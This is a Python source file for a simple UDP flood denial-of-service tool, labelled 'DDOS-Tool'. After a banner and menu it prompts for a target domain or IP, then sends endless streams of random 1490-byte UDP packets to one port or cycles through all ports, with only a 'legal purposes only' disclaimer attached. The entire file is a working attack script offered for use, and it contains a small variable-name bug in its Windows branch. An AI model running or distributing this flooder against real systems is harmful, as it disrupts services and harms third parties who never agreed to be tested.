"""
Copyright (c) 2023 Mr.X (whomrx666@gmail.com)

Distributed under the MIT License (MIT) (See accompanying file LICENSE.txt
or copy at http://opensource.org/licenses/MIT)
"""

# Import.
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet


# Version.
version = "1.0"


# Platform info
uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


# DDoS_Tool
while True:
    # UI.
    print("          \033[95m  ______    ______         __ \033[0m     ______)        Version: " + version)
    print("           \033[95m(, /    ) (, /    )   (__/  )\033[0m    (, /        /)")
    print("           \033[95m  /    /    /    / ___  /     \033[0m     /  ______// ")
    print("         \033[95m  _/___ /_  _/___ /_(_)) /     \033[0m   ) /  (_)(_)(/_")
    print("         \033[95m(_/___ /  (_/___ /    (_/      \033[0m  (_/\n")
    print("                        Author: Mr.\033[91mX\033[0m")
    print("       Github: https://github.com/Whomrx666/DDOS-Tool")
    print('                   For legal purposes only')
    print("\033[92;1m")
    print("1. Website Domain\n2. IP Address\n3. About\n4. Exit")
    print('\033[0m')

    # Input.
    opt = str(input("\n> "))

    # Selection.
    if opt == '1':
        domain = str(input("Domain:"))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = str(input("IP Address: "))
        break

    elif opt == '3':
        print("DDOS-Tool is an open source tool for\033[0m")
        print("penetration. You can test networks/servers/any\033[0m")
        print("other devices with it.\033[0m")
        print("                                                         \033[0m")
        print("Author of the program is not responsible for")
        print("it's usage, everybody MUST use it ONLY in'")
        print("legit cases.")
        print("\nFor more information visit project's site.")
        
        goon = input("\n\n\n\n\n\n\nPress Enter to continue.")
        os.system(cmd_clear)

    elif opt == '4':
        exit()

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)

# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
port = 2

while 1:
    port_bool = str(input("Certain port? [y/n]: "))

    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)

# Starting working.
os.system(cmd_clear)
print('\033[36;2mINITIALIZING....')
time.sleep(1)
print('STARTING...')
time.sleep(4)

sent = 0

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

elif port_mode == True: # Certain port.
    if port < 2:
        port = 2
        
    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1901

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
    except:
        print('\n\033[31;1mExited\033[0m')
